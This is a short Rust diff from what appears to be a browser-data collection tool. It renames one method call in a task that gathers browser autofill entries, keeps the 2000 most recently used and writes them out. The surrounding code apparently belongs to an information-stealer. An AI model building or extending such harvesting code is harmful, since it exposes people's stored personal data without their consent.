@@ -38,7 +38,7 @@ impl<C: Collector> Task<C> for AutoFillTask {
         autofills.sort_by(|a, b| b.last_used.cmp(&a.last_used));
         autofills.truncate(2000);
 
-        collector.browser().increase_auto_fills_by(autofills.len());
+        collector.get_browser().increase_auto_fills_by(autofills.len());
 
         let _ = to_string_and_write_all(&autofills, "\n\n", parent);
     }
